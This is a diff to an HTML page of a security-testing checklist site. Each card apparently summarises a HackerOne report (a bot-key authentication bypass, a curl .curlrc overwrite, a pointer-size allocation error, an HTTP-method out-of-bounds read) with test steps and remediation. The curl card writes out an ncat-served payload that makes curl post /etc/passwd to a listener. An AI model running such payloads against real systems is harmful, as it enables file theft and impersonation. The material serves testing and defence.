+        <p><strong class="section-heading section-description">Description:</strong> A vulnerability exists where bot authentication mechanisms can be bypassed through predictable or easily guessable identifiers. This allows an attacker to impersonate legitimate users by crafting malicious bot keys, potentially enabling unauthorized actions and data manipulation. This can lead to compromised user accounts and sensitive information exposure.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Identify an API endpoint that utilizes bot authentication.</li>
+<li>Examine the authentication logic for bot keys, looking for predictable components or sequences.</li>
+<li>If bot keys are constructed using identifiable components, attempt to craft a malicious bot key where the second component (token) is missing or empty. Example: <code>&lt;TARGET<em>URL&gt;/messages?bot</em>key=1-</code>.</li>
+<li>Send a request with the crafted bot key.</li>
+<li>Verify if the request is processed without proper authentication and if the user is impersonated.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Unauthorized message posting as any user within accessible rooms, potentially leading to data breaches and account compromise.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement robust bot authentication with randomly generated and securely stored tokens. Ensure the bot key structure is unpredictable and resistant to guessing. Validate bot key components and deny requests with incomplete or invalid keys.</p>
+        <div class="card-meta">
+          <span>Added: 2025-12-26</span>
+        </div>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="API">
+      <button type="button" class="card-toggle">
+        <span class="card-title">Persistent Configuration File Overwrite via curl</span>
+        <span class="card-meta-mini">
+          <span class="badge">API</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability arises when <code>curl</code> downloads a file using the <code>-OJ</code> flags, allowing a malicious server to dictate the saved filename as <code>.curlrc</code>. Subsequent <code>curl</code> commands are then influenced by the attacker-controlled contents of this configuration file, leading to unauthorized actions. It is critical to validate downloaded content and avoid downloading files into user-controlled directories.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Set up a simple HTTP server that serves a malicious <code>.curlrc</code> file. Example payload:</li>
+</ol>
+<pre><code>cat &lt;&lt;&#x27;EOF&#x27; | ncat -l 8000 --keep-open
+HTTP/1.1 200 OK
+Content-Length: 63
+Content-Disposition: attachment; filename=&quot;.curlrc&quot;
+
+url = &quot;http://127.0.0.1:8000/leak&quot;
+data = &quot;@/etc/passwd&quot;
+EOF</code></pre>
+<ol>
+<li>Execute a <code>curl</code> command with the <code>-OJ</code> flags, pointing to the attacker-controlled server, from a user&#x27;s home directory: <code>curl -OJ &lt;TARGET_URL&gt;/pwn</code>.  This overwrites the user&#x27;s <code>~/.curlrc</code> file.</li>
+<li>Subsequent <code>curl</code> commands will execute the malicious configurations defined in <code>~/.curlrc</code>, potentially leading to data exfiltration. For example, a simple <code>curl &lt;TARGET_URL&gt;</code> might now silently fetch the contents of <code>/etc/passwd</code> and send it to <code>http://127.0.0.1:8000/leak</code>.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Unauthorized data exfiltration, potential for man-in-the-middle attacks by proxying requests.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Validate file content and origin before execution, avoid downloading files into user-controlled directories, use secure configuration management practices.</p>
+        <div class="card-meta">
+          <span>Added: 2025-12-26</span>
+        </div>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Source Code">
+      <button type="button" class="card-toggle">
+        <span class="card-title">Incorrect Memory Allocation Size Calculation</span>
+        <span class="card-meta-mini">
+          <span class="badge">Source Code</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> A flawed calculation of memory allocation size can lead to under-allocation and potential crashes or vulnerabilities. The issue occurs when the size of a pointer is used instead of the size of the data it points to, which may only be masked by the system architecture or data structure sizes. This violates coding best practices and reduces code maintainability.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Inspect the source code for memory allocation using pointer sizes instead of element sizes (e.g., <code>malloc(sizeof(pointer) * length)</code>).</li>
+<li>Verify that the allocation size matches the size of the data being allocated using <code>sizeof(*pointer)</code>.</li>
+<li>Compile the code on both 32-bit and 64-bit systems to check for discrepancies in allocation sizes.</li>
+<li>Modify the data structure pointed to by the pointer and re-run the tests.</li>
+<li>Example: <code>size<em>t incorrect</em>size = sizeof(pointer);</code> followed by <code>size<em>t correct</em>size = sizeof(*pointer);</code> and compare the values.  <code>&lt;PAYLOAD&gt;</code> represents the expected value when both values are the same.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Potential memory corruption, application crashes, or security vulnerabilities due to under-allocation.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Always use <code>sizeof(*pointer)</code> when calculating memory allocation sizes to ensure correctness and portability across different systems and data structures.</p>
+        <div class="card-meta">
+          <span>Added: 2025-12-26</span>
+        </div>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="API">
+      <button type="button" class="card-toggle">
+        <span class="card-title">Out-of-bounds Read in HTTP Method Handling</span>
+        <span class="card-meta-mini">
+          <span class="badge">API</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> A vulnerability exists where an HTTP method string is copied into memory without null termination. This can lead to an out-of-bounds read when functions like <code>strcmp</code> or <code>strlen</code> are used on the method string, potentially causing a denial of service or misclassification of requests. This issue highlights the importance of proper memory management and null termination when handling dynamic strings.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Configure a test environment with the ability to send custom HTTP requests.</li>
+<li>Construct an HTTP request with a custom method string that exceeds the allocated buffer size. For example: <code>&lt;PAYLOAD&gt;CONNECTabcdefgh</code>.</li>
+<li>Send the crafted HTTP request to <code>&lt;TARGET_URL&gt;</code>.</li>
+<li>Observe the application for crashes, unexpected behavior, or denial-of-service conditions.</li>
+<li>Use memory sanitizers (e.g., AddressSanitizer) to identify out-of-bounds reads.  Build the application with <code>-fsanitize=address</code> and run the test case.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Denial of service due to application crash, misclassification of HTTP requests (e.g., CONNECT being treated as a different method).</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Always ensure that strings are null-terminated after being copied into memory. Allocate sufficient memory to accommodate the largest possible string length. Use safe string handling functions to prevent buffer overflows.</p>
+        <div class="card-meta">
+          <span>Added: 2025-12-26</span>
+        </div>
+      </div>
+    </article>
+    
     </section>
+    </main>
+    <footer class="site-footer">
+      <div class="site-footer__inner">
+        <a class="site-brand" href="/">
+          <span class="site-brand__mark"></span>
+          <span class="site-brand__text">Cyber Frogy</span>
+        </a>
+        <div class="site-footer__copy">
+          <p>Every report from HackerOne is analysed by local AI (Ollama) and generic test case has been derrived to be used as a checklist to test other websites.</p>
+        </div>
+        <div class="site-footer__nav">
+          <a class="site-footer__link" href="/whoami">Whoami</a>
+          <a class="site-footer__link" href="/posts">Blog</a>
+          <a class="site-footer__link" href="/mindmaps">Mindmaps</a>
+          <a class="site-footer__link" href="/checklists">Checklists</a>
+          <a class="site-footer__link" href="/threat-actor-db">Threat-Actor DB</a>
+          <a class="site-footer__link" href="/github">GitHub</a>
+        </div>
+      </div>
+    </footer>
   </div>
 
   <script>
@@ -1602,5 +2862,9 @@ int main() {
     });
 
   </script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
+  <script src="/js/custom.js"></script>
 </body>
 </html>
